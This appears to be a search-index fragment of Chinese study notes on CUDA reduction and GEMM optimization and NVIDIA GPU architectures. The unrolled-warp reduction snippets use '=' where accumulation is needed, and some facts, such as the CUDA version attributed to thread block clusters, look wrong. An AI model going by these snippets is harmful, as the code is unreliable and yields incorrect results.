\u5bf9\u4e8e\u8ba1\u7b97\u5bc6\u96c6\u5e94\u7528\uff1a\u5cf0\u503c\u6027\u80fdGFLOP/s - \u5bf9\u4e8e\u8bbf\u5b58\u5bc6\u96c6\u5e94\u7528\uff1a\u5cf0\u503c\u5e26\u5bbdbandwidth</p>","tags":["cuda"]},{"location":"%E5%AD%A6%E4%B9%A0/2023/04/16/2023-04-16-CUDA%E4%BC%98%E5%8C%96/#\u4e8c\u53c9\u89c4\u7ea6","title":"\u4e8c\u53c9\u89c4\u7ea6","text":"<p>\u662fmemory bound\u5e94\u7528\uff1a - \u8ba1\u7b97\u5f3a\u5ea6\u5f88\u4f4e\uff081 flop/operator\uff09</p> <ul> <li>1: interleaved_addressing v1: \u6bcf\u4e2a\u7ebf\u7a0b\u8bfb\u53d6\u4e00\u4e2a\u5143\u7d20\u5230SMEM\uff0c\u7136\u540e\u4e8c\u53c9\u89c4\u7ea6\uff08stride\uff09 <pre><code>__global__ void reduce0(int *g_idata, int *g_odata){\n  extern __shared__ int sdata[];\n\n  int tid = threadIdx.x;\n  int i = blockIdx.x*blockDim.x + threadIdx.x;\n  // each thread loads one element from global to shared mem\n  sdata[tid] = g_idata[i];\n  __syncthreads();\n\n  //do reduction in SMEM\n  for(int s=1; s&lt;blockDim.x; s*=2){\n    if(tid %(2*s)==0){\n      sdata[tid] += sdata[tid + s];\n    }\n    __syncthreads();\n  }\n\n  //write result for this block to GMEM\n  if(tid==0) g_odata[blockIdx.x] = sdata[0];\n}\n</code></pre></li> <li> <p>\u7ebf\u7a0b\u5206\u652fdiverge\u592a\u591a \u5982\u56fe\uff0c\u5047\u8bbe\u4e00\u4e2awarp\u5305\u542b\u4e24\u4e2a\u7ebf\u7a0b\u3002\u5219\u56fe\u4e2d8\u4e2a\u7ebf\u7a0b\u9700\u89814\u4e2awarp\u3002\u800c\u5373\u4f7f\u4e00\u4e2awarp\u91cc\u53ea\u6709\u4e00\u4e2a\u7ebf\u7a0b\uff0c\u4ecd\u7136\u9700\u8981\u5360\u7528\u4e00\u4e2awarp\u3002\u56e0\u6b64\u4e0a\u9762\u7684\u7b97\u6cd5\u4f1a\u5bfc\u81f44+4+2+1=11\u6b21warp\u8c03\u7528\u3002 v2\u7248\u672c\u7684\u4ee3\u7801\u5219\u4e00\u4e2awarp\u91cc\u7684\u4e24\u4e2a\u7ebf\u7a0b\u90fd\u662f\u5de5\u4f5c\u7684\uff0c\u9700\u89814+2+1+1=8\u6b21\uff08\u76d7\u56fe\u81ea\uff1ahttp://home.ustc.edu.cn/~shaojiemike/posts/nvidiaoptimize/\uff09 </p> </li> <li> <p>2: interleaved_addressing v2: <pre><code>for(int s=1; s&lt;blockDim.x; s*=2){\n  int index = 2*s*tid;\n  if(index &lt; blockDim.x){\n    sdata[index] += sdata[index+s];\n  }\n  __syncthreads();\n}\n</code></pre></p> </li> <li>SMEM bank conflict</li> <li>3: sequential addressing <pre><code>for(int s=blockDim.x/2; s&gt;0; s&gt;&gt;=1){\n  if(tid &lt; s){\n    sdata[tid] += sdata[tid+s];\n  }\n  __syncthreads();\n}\n</code></pre></li> <li>\u7b2c\u4e00\u6b21\u8fed\u4ee3\u5c31\u5df2\u7ecf\u4e00\u534a\u7684\u7ebf\u7a0b\u662f\u7a7a\u95f2\u7684</li> <li>4: first add during load\uff1a</li> <li>\u4ecd\u7136\u8fbe\u4e0d\u5230\u5e26\u5bbd\u4e0a\u9650\uff0c\u56e0\u6b64\u53ef\u80fd\u662f\u6307\u4ee4\u5f00\u9500<ul> <li>\u8f85\u52a9\u7c7b\u6307\u4ee4(ancillary)\uff1a\u4e0d\u662fload, store\u548c\u6838\u5fc3\u8ba1\u7b97\u7684\u7b97\u6570\u6307\u4ee4</li> <li>\u5373\u5730\u5740\u8ba1\u7b97\u548c\u5faa\u73af\u5f00\u9500 <pre><code>&lt;&lt;&lt;n/64/2, 64&gt;&gt;&gt;kernel();\n\nint i = blockIdx.x * (blockDim.x*2) + threadIdx.x;\nsdata[tid] = g_idata[i] + g_idata[i + blockDim.x];\n</code></pre></li> </ul> </li> <li>5\uff1aUnroll the last warp</li> <li>\u6d3b\u52a8\u7ebf\u7a0b\u6570\u968f\u7740\u89c4\u7ea6\u8fed\u4ee3\u6b21\u6570\u589e\u52a0\u800c\u51cf\u5c11</li> <li>\u5f53s&lt;=32\u65f6\uff0c\u53ea\u6709\u4e00\u4e2awarp\u3002warp\u5185\u7684\u6307\u4ee4\u65f6SIMD\u540c\u6b65\u7684\u3002<ul> <li>\u56e0\u6b64\u4e0d\u9700\u8981__syncthread()\uff0c\u4e0d\u9700\u8981if(tid &lt; s) <pre><code>for(int s=blockDim.x/2; s&gt;32; s&gt;&gt;=1){\n  if(tid &lt; s){\n    sdata[tid] += sdata[tid+s];\n  }\n  __syncthreads();\n}\nif(tid&lt;32){\n  sdata[tid] = sdata[tid+32];\n  sdata[tid] = sdata[tid+16];\n  sdata[tid] = sdata[tid+8];\n  sdata[tid] = sdata[tid+4];\n  sdata[tid] = sdata[tid+2];\n  sdata[tid] = sdata[tid+1];\n}\n</code></pre></li> </ul> </li> <li>6: completely Unrolled</li> <li>\u5bf9\u4e8e\u56fa\u5b9a\u5927\u5c0f\u7684\u7ebf\u7a0b\u5757\uff0c\u53ef\u4ee5\u5b8c\u5168\u5c55\u5f00\u3002\u800cGPU\u7ebf\u7a0b\u5757\u7684\u5927\u5c0f\u662f2\u7684\u5e42\uff0c\u5e76\u4e14&lt;1024\u3002</li> <li>\u53ef\u4ee5\u4f7f\u7528\u6a21\u677f\uff0c\u9488\u5bf9\u4e0d\u540c\u7684\u7ebf\u7a0b\u5757\u5b8c\u5168\u5c55\u5f00 <pre><code>template&lt;int blockSize&gt;\n__global__ void reduce5(int *g_idata, int *g_odata)\n</code></pre></li> </ul> <pre><code>if(blockSize&gt;=512){\n  if(tid&lt;256){sdata[tid]+=sdata[tid+256];} __syncthreads();\n}\nif(blockSize&gt;=256){\n  if(tid&lt;128){sdata[tid]+=sdata[tid+128];} __syncthreads();\n}\nif(blockSize&gt;=128){\n  if(tid&lt;64){sdata[tid]+=sdata[tid+64];} __syncthreads();\n}\nif(tid&lt;32){\n  if(blockSize &gt;= 64) sdata[tid] = sdata[tid+32];\n  if(blockSize &gt;= 32) sdata[tid] = sdata[tid+16];\n  if(blockSize &gt;= 16) sdata[tid] = sdata[tid+8];\n  if(blockSize &gt;=  8) sdata[tid] = sdata[tid+4];\n  if(blockSize &gt;=  4) sdata[tid] = sdata[tid+2];\n  if(blockSize &gt;=  2) sdata[tid] = sdata[tid+1];\n}\n</code></pre> <p></p>","tags":["cuda"]},{"location":"%E5%AD%A6%E4%B9%A0/2023/04/16/2023-04-16-CUDA%E4%BC%98%E5%8C%96/#gemm","title":"GEMM","text":"","tags":["cuda"]},{"location":"%E5%AD%A6%E4%B9%A0/2023/04/16/2023-04-16-CUDA%E4%BC%98%E5%8C%96/#\u53c2\u8003\u8d44\u6599","title":"\u53c2\u8003\u8d44\u6599","text":"<p>\u6df1\u5165\u6d45\u51faGPU\u4f18\u5316\u7cfb\u5217\uff1aGEMM\u4f18\u5316\uff08\u4e00\uff09 - \u77e5\u4e4e (zhihu.com)</p>","tags":["cuda"]},{"location":"%E5%AD%A6%E4%B9%A0/2023/04/16/2023-04-16-CUDA%E4%BC%98%E5%8C%96/#sc2010-fast-implementation-of-dgemm-on-fermi-gpu","title":"SC'2010 Fast implementation of DGEMM on Fermi GPU","text":"<p>\u4e3a\u4e86\u8ba9\u8ba1\u7b97\u5355\u5143\u5145\u5206\u5229\u7528\uff0c\u4e0d\u8ba9\u8bbf\u5b58\u79f0\u4e3a\u74f6\u9888\u3002\u6839\u636e\u5b9e\u9645\u786c\u4ef6\u53c2\u6570\uff0c\u53ef\u4ee5\u5f97\u5230\u5bf9\u5206\u5757\u5927\u5c0f\u7684\u4e00\u4e2a\u4e0b\u754c - \\(\\#\\mathrm{CUDA}\\times\\mathrm{freq}\\times DW\\times 1/2(1/b_m + 1/b_n)&lt;BW\\)   - DW\u8868\u793a\u5143\u7d20\u5b57\u8282\u6570\uff0c\u5982double float\uff0c8Byte - \u540c\u7406\u6839\u636eshard memory\u5e26\u5bbd\uff0c\u53ef\u4ee5\u5f97\u5230\\(r_x, r_y\\)\u7684\u4e0d\u7b49\u5f0f</p> <p>\u6839\u636eshared memory\u5927\u5c0f\uff0c\u53ef\u4ee5\u5f97\u5230\u5206\u5757\u5927\u5c0f\u7684\u4e00\u4e2a\u4e0a\u754c \\((b_m*b_k + b_n*b_k)*DW &lt; M_{shared}\\) \u6839\u636eregister file\u7684\u5927\u5c0f\uff0c\u5f97\u5230rx, ry\u7684\u4e0a\u754c \\((r_x+r_y+r_x*r_y)*{TRHEAD\\_PER\\_BLOCK} &lt; 32768\\)</p> <p></p>","tags":["cuda"]},{"location":"%E5%AD%A6%E4%B9%A0/2023/04/16/2023-04-16-CUDA%E4%BC%98%E5%8C%96/#\u5b9e\u8df5","title":"\u5b9e\u8df5","text":"<ul> <li>simple</li> <li>C\u4e2d\u6bcf\u4e2a\u5143\u7d20\u6bcf\u4e2a\u5bf9\u5e94\u4e00\u4e2a\u7ebf\u7a0b\u3002<ul> <li>\u7531\u4e8e\u4e00\u4e2a\u5757\u5185\u7ebf\u7a0b\u6570\u6709\u4e0a\u9650\uff0c\u56e0\u6b64\u4ecd\u7136\u9700\u8981\u5212\u5206\u5757\u3002</li> </ul> </li> <li>block shared memory</li> <li>\u53ef\u4ee5\u53d1\u73b0\u8ba1\u7b97C\u4e2d\u76f8\u90bb\u5143\u7d20\u65f6\uff0c\u4f1a\u5229\u7528\u91cd\u590d\u7684\u884c\u6216\u5217\u3002\u56e0\u6b64\u53ef\u4ee5\u8003\u8651\u5c06\u82e5\u5e72\u7ebf\u7a0b\u7ec4\u7ec7\u6210\u4e00\u4e2a\u5757\uff0c\u5171\u4eab\u4e00\u90e8\u5206\u6570\u636e\u3002\u521a\u597d\u5bf9\u5e94\u786c\u4ef6\u7684SMEM\u3002</li> </ul>","tags":["cuda"]},{"location":"%E5%AD%A6%E4%B9%A0/2023/04/16/2023-04-16-CUDA%E6%9E%B6%E6%9E%84/","title":"CUDA\u67b6\u6784","text":"","tags":["cuda"]},{"location":"%E5%AD%A6%E4%B9%A0/2023/04/16/2023-04-16-CUDA%E6%9E%B6%E6%9E%84/#\u7591\u95ee","title":"\u7591\u95ee","text":"<ul> <li>ampere\u67b6\u6784SM\u4e2d\u67094\u4e2aprocess block\uff0cprocess block\u5bf9\u5e94\u4e00\u4e2awarp\uff1f\u610f\u601d\u662f\u53ef\u4ee5\u67094\u4e2awarp\u540c\u65f6\u6267\u884c\uff1f</li> <li>Femi\u67b6\u6784\u6ca1\u6709process block\uff0cSM\u5c31\u662f\u6700\u5c0f\u5355\u5143\uff1f</li> <li>The threads of a thread block execute concurrently on one multiprocessor, and multiple thread blocks can execute concurrently on one multiprocessor.</li> <li>\u8fd9\u6837\u5c82\u4e0d\u662f\u82e5\u5e72thread block\u62a2\u4e00\u4e2aSM\u4e0a\u7684shared memory\uff1f</li> <li> <p>\u4e0d\u540cthreadblock\u7684warp\u5e76\u53d1\u6267\u884c\uff0c\u5982\u4f55\u9690\u85cf\u5ef6\u8fdf</p> </li> <li> <p>cuda\u5206\u5757\u5927\u5c0f\u5bf9\u6027\u80fd\u5f71\u54cd\u5f88\u5927\uff0c\u90a3\u4e48\u5982\u4f55\u786e\u5b9a\u5206\u5757\u5927\u5c0f\u5462\uff1f</p> </li> <li>\u7a77\u4e3e</li> <li>\u5206\u6790\u6a21\u578b\uff1f</li> </ul>","tags":["cuda"]},{"location":"%E5%AD%A6%E4%B9%A0/2023/04/16/2023-04-16-CUDA%E6%9E%B6%E6%9E%84/#nv\u67b6\u6784\u5217\u8868","title":"NV\u67b6\u6784\u5217\u8868","text":"","tags":["cuda"]},{"location":"%E5%AD%A6%E4%B9%A0/2023/04/16/2023-04-16-CUDA%E6%9E%B6%E6%9E%84/#compute-capacity","title":"compute capacity","text":"<p>Matching CUDA arch and CUDA gencode for various NVIDIA architectures - Arnon Shimoni</p> <ul> <li>Pascal</li> <li>SM61: 1080</li> <li>volta</li> <li>SM70: Tesla V100, Titan V</li> <li>Ampere</li> <li> <p>SM80: NVIDIA A100 (the name \u201cTesla\u201d has been dropped \u2013 GA100)) </p> </li> <li> <p>Tesla(2008)</p> </li> <li>Fermi(2010)</li> <li>Kepler(2012)\uff1aK80</li> <li>Maxwell(2014)\uff1a M10/M40</li> <li>Pascal(2016)\uff1a Tesla P40\u3001P100\u3001GTX 1080Ti  Titan XP\u3001Quadro GP100/P6000/P5000\uff0c10\u7cfb</li> <li>Volta(2017)\uff1a Tesla V100\u3001GeForce Titan V\u3001Quadro GV100\u4e13\u4e1a\u5361</li> <li>Turing(2018)\uff1a 1\u4e2aSM 8\u4e2aTensor core\uff0c1\u4e2aRT core\uff0c16\uff0c20\u7cfb</li> <li>Ampere(2020)\uff1a A100\uff0c30\u7cfb</li> <li>Hopper(2022)\uff1aH100</li> </ul> <p>1080: 20x128 1080ti: 28x128, gp104 p40: 30x128, gp102 p100: 28x128, HBM2(4096bit)</p> <p>Ampere (microarchitecture) - Wikipedia</p> <p></p> <p>NVIDIA GPU \u67b6\u6784\u68b3\u7406 - \u77e5\u4e4e (zhihu.com)</p>","tags":["cuda"]},{"location":"%E5%AD%A6%E4%B9%A0/2023/04/16/2023-04-16-CUDA%E6%9E%B6%E6%9E%84/#fermi","title":"Fermi","text":"<ul> <li>\u6a59\u8272\u90e8\u5206\uff1a2 \u4e2a Warp Scheduler/Dispatch Unit</li> <li>\u7eff\u8272\u90e8\u5206\uff1a32 \u4e2a CUDA \u5185\u6838\uff0c\u5206\u5728\u4e24\u6761 lane \u4e0a\uff0c\u6bcf\u6761\u5206\u522b\u662f 16 \u4e2a</li> </ul> <p>https://stackoverflow.com/a/10467342</p> <p>The programmer divides work into threads, threads into thread blocks, and thread blocks into grids. The compute work distributor allocates thread blocks to Streaming Multiprocessors (SMs). Once a thread block is distributed to a SM the resources for the thread block are allocated (warps and shared memory) and threads are divided into groups of 32 threads called warps. Once a warp is allocated it is called an active warp. The two warp schedulers pick two active warps per cycle and dispatch warps to execution units. For more details on execution units and instruction dispatch see\u00a01\u00a0p.7-10 and\u00a02.</p> <p>Fermi\uff0c\u4e00\u4e2aSM\u6709\u4e24\u4e2awarp\u4fdd\u8bc1\u6bcf\u5468\u671f\u6709\u6307\u4ee4\u53ef\u4ee5\u53d1\u5c04</p> <p>A stalled warp is ineligible to be selected by the warp scheduler. On Fermi it is useful to have at least 2 eligible warps per cycle so that the warp scheduler can issue an instruction.</p> <p>GeForce 560Ti\uff0c8SM\uff0c\u6bcf\u4e2a48CUDA</p> <p>If you launch kernel&lt;&lt;&lt;8, 48&gt;&gt;&gt; you will get 8 blocks each with 2 warps of 32 and 16 threads. There is no guarantee that these 8 blocks will be assigned to different SMs.</p> <ul> <li>\u6bcf\u4e2aSM\u53ef\u4ee5\u6709\u5f88\u591a\u7ebf\u7a0b\u5757 <p>A GTX560 can have 8 SM * 8 blocks = 64 blocks at a time or 8 SM * 48 warps = 512 warps if the kernel does not max out registers or shared memory. At any given time on a portion of the work will be active on SMs. Each SM has multiple execution units (more than CUDA cores). Which resources are in use at any given time is dependent on the warp schedulers and instruction mix of the application. If you don't do TEX operations then the TEX units will be idle. If you don't do a special floating point operation the SUFU units will idle.</p> </li> </ul> <p></p>","tags":["cuda"]},{"location":"%E5%AD%A6%E4%B9%A0/2023/04/16/2023-04-16-CUDA%E6%9E%B6%E6%9E%84/#\u767d\u76ae\u4e66","title":"\u767d\u76ae\u4e66","text":"<p>Microsoft Word - NVIDIA Fermi Architecture Whitepaper.docx</p> <p>\u53cc\u53d1\u5c04 </p> <p>Fermi\u2019s dual warp scheduler selects two warps, and issues one instruction from each warp to a group of sixteen cores, sixteen load/store units, or four SFUs. Because warps execute independently, Fermi\u2019s scheduler does not need to check for dependencies from within the instruction stream. Using this elegant model of dual-issue, Fermi achieves near peak hardware performance. Most instructions can be dual issued; two integer instructions, two floating instructions, or a mix of integer, floating point, load, store, and SFU instructions can be issued concurrently. Double precision instructions do not support dual dispatch with any other operation.</p> <p>\u53ef\u914d\u7f6e\u7684shared memory\u548cL1 cache</p> <p>G80 and GT200 have 16 KB of shared memory per SM. In the Fermi architecture, each SM has 64 KB of on-chip memory that can be configured as 48 KB of Shared memory with 16 KB of L1 cache or as 16 KB of Shared memory with 48 KB of L1 cache.</p>","tags":["cuda"]},{"location":"%E5%AD%A6%E4%B9%A0/2023/04/16/2023-04-16-CUDA%E6%9E%B6%E6%9E%84/#kepler","title":"Kepler","text":"<ul> <li>\u4e00\u4e2aSMX 192\u4e2aCUDA </li> </ul>","tags":["cuda"]},{"location":"%E5%AD%A6%E4%B9%A0/2023/04/16/2023-04-16-CUDA%E6%9E%B6%E6%9E%84/#maxwell","title":"Maxwell","text":"<ul> <li>SMM\uff1a\u56db\u4e2a\u5904\u7406\u5757(processing block)\uff0c\u6bcf\u4e2a\u6709\u4e13\u7528\u7684warp\u8c03\u5ea6\u5668\uff0c\u5305\u542b32\u4e2acore </li> </ul>","tags":["cuda"]},{"location":"%E5%AD%A6%E4%B9%A0/2023/04/16/2023-04-16-CUDA%E6%9E%B6%E6%9E%84/#volta","title":"volta","text":"<p>\u8df3\u8fc7\u4e86pascal\uff1a\u4e00\u4e2aSM\u4e24\u4e2a\u5904\u7406\u5757</p> <ul> <li>SM\uff1a4\u4e2ablock</li> <li>\u5c06\u4e00\u4e2aCUDA\u62c6\u5206\u6210FP32\u548cINT32\uff0c\u6bcf\u4e2a\u5468\u671f\u53ef\u4ee5\u540c\u65f6\u6267\u884c\u6d6e\u70b9\u548c\u6574\u6570\u3002</li> <li>\u6dfb\u52a0tensor core </li> </ul>","tags":["cuda"]},{"location":"%E5%AD%A6%E4%B9%A0/2023/04/16/2023-04-16-CUDA%E6%9E%B6%E6%9E%84/#ampere\u67b6\u6784","title":"ampere\u67b6\u6784","text":"<p>\u8df3\u8fc7turing\uff1a\u53bb\u6389\u4e86F64</p> <p></p>","tags":["cuda"]},{"location":"%E5%AD%A6%E4%B9%A0/2023/04/16/2023-04-16-CUDA%E6%9E%B6%E6%9E%84/#cuda\u67b6\u6784","title":"CUDA\u67b6\u6784","text":"","tags":["cuda"]},{"location":"%E5%AD%A6%E4%B9%A0/2023/04/16/2023-04-16-CUDA%E6%9E%B6%E6%9E%84/#\u53c2\u8003\u8d44\u6599","title":"\u53c2\u8003\u8d44\u6599","text":"<ul> <li>CUDA C++ Programming Guide (nvidia.com)</li> </ul>","tags":["cuda"]},{"location":"%E5%AD%A6%E4%B9%A0/2023/04/16/2023-04-16-CUDA%E6%9E%B6%E6%9E%84/#\u57fa\u7840","title":"\u57fa\u7840","text":"<p>In CUDA programming, both CPUs and GPUs are used for computing. Typically, we refer to CPU and GPU system as\u00a0host\u00a0and\u00a0device, respectively. CPUs and GPUs are separated platforms with their own memory space. Typically, we run serial workload on CPU and offload parallel computation to GPUs.</p> <ul> <li>\u4e09\u4e2a\u5173\u952e\u62bd\u8c61\uff1a</li> <li>\u5c42\u6b21\u5316\u7684\u7ebf\u7a0b\u7ec4</li> <li>\u5171\u4eab\u5185\u5b58</li> <li>\u540c\u6b65</li> </ul> <p>\u9ad8\u5ea6\u53ef\u6269\u5c55\u6027\uff1a </p>","tags":["cuda"]},{"location":"%E5%AD%A6%E4%B9%A0/2023/04/16/2023-04-16-CUDA%E6%9E%B6%E6%9E%84/#\u7f16\u7a0b\u6a21\u578b","title":"\u7f16\u7a0b\u6a21\u578b","text":"","tags":["cuda"]},{"location":"%E5%AD%A6%E4%B9%A0/2023/04/16/2023-04-16-CUDA%E6%9E%B6%E6%9E%84/#\u7ebf\u7a0b\u5c42\u6b21","title":"\u7ebf\u7a0b\u5c42\u6b21","text":"<p>kernel - C++\u51fd\u6570\uff0c\u88ab\u8c03\u7528\u65f6\uff0c\u4f1a\u88ab\u6bcf\u4e2aCUDA\u7ebf\u7a0b\u5e76\u884c\u6267\u884c\u3002 - \u4f7f\u7528__global__\u58f0\u660ekernel\u51fd\u6570 - \u4f7f\u7528<code>&lt;&lt;&lt;...&gt;&gt;&gt;</code>execution configuration\u00a0syntax\uff0c\u6307\u5b9a\u4f7f\u7528\u591a\u5c11\u7ebf\u7a0b\u6267\u884c\u8be5kernel</p> <p>\u7ebf\u7a0b\u5c42\u6b21 - block\uff1a\u591a\u4e2a\u7ebf\u7a0b\u7ec4\u6210\u4e00\u4e2a\u7ebf\u7a0b\u5757\u3002\u53ef\u4ee5\u662f1,2,3\u7ef4\u7684   - \u901a\u8fc7<code>threadIdx</code>\u7d22\u5f15\u3002\u5982\u4e8c\u7ef4 (x, y)\u00a0\u7684\u7ebf\u7a0bid\u662f\u00a0(x + y Dx);   - \u4e00\u4e2a\u5757\u5185\u7684\u7ebf\u7a0b\u6570\u662f\u6709\u9650\u5236\u7684\uff08\u5f53\u524d\u7684GPU\u4e00\u822c\u4e3a1024\u4e2a\uff09\u3002\u56e0\u4e3a\u4e00\u4e2a\u5757\u5185\u7684\u7ebf\u7a0b\u4f1a\u88ab\u8c03\u5ea6\u5230\u4e00\u4e2aSM(streaming multiprocessor core)\u4e2d\uff0c\u5171\u4eab\u8be5SM\u7684\u7247\u4e0a\u5b58\u50a8\uff08shared memory\uff09   - \u4e00\u4e2a\u5757\u662f\u72ec\u7acb\u7684\uff0c\u53ef\u4ee5\u4ee5\u4efb\u610f\u987a\u5e8f\u8c03\u5ea6\uff0c\u4ece\u800c\u4fdd\u8bc1\u4e86GPU\u7684\u53ef\u6269\u5c55\u6027\uff08SM\u662f\u57fa\u672c\u5355\u5143\uff0c\u5806SM\uff09   - shared memory\u5ef6\u8fdf\u5f88\u4f4e\uff0c\u7c7b\u4f3c\u4e8eL1 cache - grid\uff1a\u591a\u4e2a\u7ebf\u7a0b\u5757\u7ec4\u6210\u4e00\u4e2agrid\u3002\u53ef\u4ee5\u662f1,2,3\u7ef4\u7684   - \u901a\u8fc7<code>blockIdx</code>\u7d22\u5f15</p> <p>\u4ee5\u4e0b\u4ee3\u7801\u58f0\u660e\u4e861\u4e2a\u7ebf\u7a0b\u5757\uff0c\u5927\u5c0f\u4e3aNxN\u3002\u7528\u4e8e\u5c06\u4e24\u4e2aNxN\u7684\u77e9\u9635\u76f8\u52a0\u3002 <pre><code>// Kernel definition\n__global__ void MatAdd(float A[N][N], float B[N][N],\n                       float C[N][N])\n{\n    int i = threadIdx.x;\n    int j = threadIdx.y;\n    C[i][j] = A[i][j] + B[i][j];\n}\n\nint main()\n{\n    ...\n    // Kernel invocation with one block of N * N * 1 threads\n    int numBlocks = 1;\n    dim3 threadsPerBlock(N, N);\n    MatAdd&lt;&lt;&lt;numBlocks, threadsPerBlock&gt;&gt;&gt;(A, B, C);\n    ...\n}\n</code></pre></p> <p>\u4ee5\u4e0b\u4ee3\u7801\u58f0\u660e\u4e86N/16 x N/16\u4e2a\u7ebf\u7a0b\u5757\uff0c\u6bcf\u4e2a\u5927\u5c0f\u4e3a16x16\u3002\u7528\u4e8e\u5c06\u4e24\u4e2aNxN\u7684\u77e9\u9635\u76f8\u52a0\u3002 <pre><code>// Kernel definition\n__global__ void MatAdd(float A[N][N], float B[N][N],\nfloat C[N][N])\n{\n    int i = blockIdx.x * blockDim.x + threadIdx.x;\n    int j = blockIdx.y * blockDim.y + threadIdx.y;\n    if (i &lt; N &amp;&amp; j &lt; N)\n        C[i][j] = A[i][j] + B[i][j];\n}\n\nint main()\n{\n    ...\n    // Kernel invocation\n    dim3 threadsPerBlock(16, 16);\n    dim3 numBlocks(N / threadsPerBlock.x, N / threadsPerBlock.y);\n    MatAdd&lt;&lt;&lt;numBlocks, threadsPerBlock&gt;&gt;&gt;(A, B, C);\n    ...\n}\n</code></pre></p> <p></p> <ul> <li>\u5728\u7ebf\u7a0b\u5757\u5185\uff0c\u7ebf\u7a0b\u901a\u8fc7shared memory\u6765\u5171\u4eab\u6570\u636e\u3002\u5e76\u4e14\u901a\u8fc7\u540c\u6b65\u64cd\u4f5c\u6765\u534f\u8c03\u5185\u5b58\u8bbf\u95ee</li> <li> <p><code>__syncthreads()</code>\u7528\u4e8e\u8def\u969c\u540c\u6b65</p> </li> <li> <p>\u7ebf\u7a0b\u5757\u851f\uff1a</p> </li> <li>CUDA 9.0\u4e2d\u5f15\u5165\u7684\u4e00\u4e2a\u53ef\u9009\u5c42\u6b21</li> <li>\u7c7b\u4f3c\u4e8e\u7ebf\u7a0b\u5757\u5185\u7ebf\u7a0b\u4fdd\u8bc1\u5728\u540c\u4e00\u4e2aSM\u3002\u4e00\u4e2acluster\u5185\u7684\u7ebf\u7a0b\u5757\u88ab\u8c03\u5ea6\u5230\u540c\u4e00\u4e2aGPU Processing Cluster (GPC)</li> <li>\u5927\u5c0f\u4e00\u822c\u6700\u59278\u4e2a\u5757</li> <li>\u652f\u6301\u786c\u4ef6\u652f\u6301\u7684\u540c\u6b65api\u3002cluster.sync() </li> </ul> <p>Threads within a CTA execute in SIMT (single-instruction, multiple-thread) fashion in groups called\u00a0warps.</p> <p>SIMD\u548cSIMT\u7684\u533a\u522b\uff1aSIMT\u7f16\u7a0b\u65f6\u53ef\u4ee5\u63a7\u5236\u5355\u4e2a\u7ebf\u7a0b\u3002</p> <p>A key difference is that SIMD vector organizations expose the SIMD width to the software, whereas SIMT instructions specify the execution and branching behavior of a single thread. In contrast with SIMD vector machines, SIMT enables programmers to write thread-level parallel code for independent, scalar threads, as well as data-parallel code for coordinated threads.</p> <p>SM\u80fd\u4e00\u6b21\u80fd\u6267\u884c\u591a\u5c11block\uff0c\u548c\u6bcf\u7ebf\u7a0bregister\u6570\u548cblock\u4f7f\u7528\u7684shared memory\u6709\u5173\u3002\u56e0\u4e3aSM\u7684\u5bc4\u5b58\u5668\u548cshared memory\u662f\u7ed9batch block\u6240\u6709\u7ebf\u7a0b\u95f4\u5206\u914d\u7684\u3002\u5982\u679c\u4e00\u4e2a\u5757\u90fd\u6267\u884c\u4e0d\u4e86\uff0c\u5219kernel\u65e0\u6cd5\u542f\u52a8\u3002</p>","tags":["cuda"]},{"location":"%E5%AD%A6%E4%B9%A0/2023/04/16/2023-04-16-CUDA%E6%9E%B6%E6%9E%84/#\u7f16\u7a0b\u63a5\u53e3","title":"\u7f16\u7a0b\u63a5\u53e3","text":"<ul> <li>\u5305\u542b\u5bf9C++\u7684\u5c11\u91cf\u6269\u5c55\u548crutime\u5e93</li> </ul> <p>C++\u6269\u5c55 - \u5b9a\u4e49kernel - \u6307\u5b9a\u7ebf\u7a0b\u6570</p> <p>CUDA runtime - \u6267\u884c\u5728host\u4e0a - \u5206\u914d\u56de\u6536device\u5185\u5b58 - \u5728host\u548cdevice\u95f4\u4f20\u8f93\u6570\u636e - \u7ba1\u7406\u591a\u4e2adevice</p> <p>\u7f16\u8bd1 - \u5c06device\u4ee3\u7801\u7f16\u8bd1\u6210ptx\u6216cubin - \u5c06host\u4ee3\u7801\u7f16\u8bd1\uff0c\u548cruntime\u94fe\u63a5   - runtime\u57fa\u4e8e\u5e95\u5c42\u53e6\u4e00\u5c42\u62bd\u8c61\u5c42\uff0c\u8be5\u62bd\u8c61\u5c42\u518d\u57fa\u4e8edriver API\u3002</p> <p>\u517c\u5bb9\u6027 - cubin\u53ea\u80fd\u5728\u5c0f\u7248\u672c\u91cc\u540e\u5411\u517c\u5bb9\u3002cubin\u00a0object generated for compute capability\u00a0X.y\u00a0will only execute on devices of compute capability\u00a0X.z\u00a0where\u00a0z\u2265y. - PTX\u53ef\u4ee5\u540e\u5411\u517c\u5bb9\uff0c\u4f46\u662f\u65e0\u6cd5\u5229\u7528\u65b0\u786c\u4ef6\u7279\u6027\u3002a binary targeting devices of compute capability 7.0 (Volta) compiled from PTX generated for compute capability 6.0 (Pascal) will not make use of Tensor Core instructions, since these were not available on Pascal. - \u540e\u5411\u517c\u5bb9(backward)\uff1a\u65e7\u7f16\u8bd1\u7684\u53ef\u4ee5\u5728\u65b0\u5e73\u53f0\u4e0a\u8fd0\u884c</p> <p></p>","tags":["cuda"]},{"location":"%E5%AD%A6%E4%B9%A0/2023/04/16/2023-04-16-CUDA%E6%9E%B6%E6%9E%84/#\u786c\u4ef6\u5b9e\u73b0","title":"\u786c\u4ef6\u5b9e\u73b0","text":"<p>https://docs.nvidia.com/cuda/cuda-c-programming-guide/index.html#hardware-implementation</p> <p>The NVIDIA GPU architecture is built around a scalable array of multithreaded\u00a0Streaming Multiprocessors\u00a0(SMs). When a CUDA program on the host CPU invokes a kernel grid, the blocks of the grid are enumerated and distributed to multiprocessors with available execution capacity. The threads of a thread block execute concurrently on one multiprocessor, and multiple thread blocks can execute concurrently on one multiprocessor. As thread blocks terminate, new blocks are launched on the vacated multiprocessors.</p> <ul> <li>\u82f1\u4f1f\u8fbeGPU\u67b6\u6784\u7531SM\u6570\u7ec4\u7ec4\u6210\uff0c\u5177\u6709\u53ef\u6269\u5c55\u6027\u3002</li> <li>\u5f53host\u4e0a\u7684\u4e00\u4e2aCUDA\u7a0b\u5e8f\u8c03\u7528\u4e00\u4e2akernel grid\u65f6\uff0cgrid\u4e2d\u7684\u7ebf\u7a0b\u5757\u88ab\u5206\u53d1\u5230\u6709\u8ba1\u7b97\u80fd\u529b\u7684SM\u4e0a\u6267\u884c\u3002</li> <li> 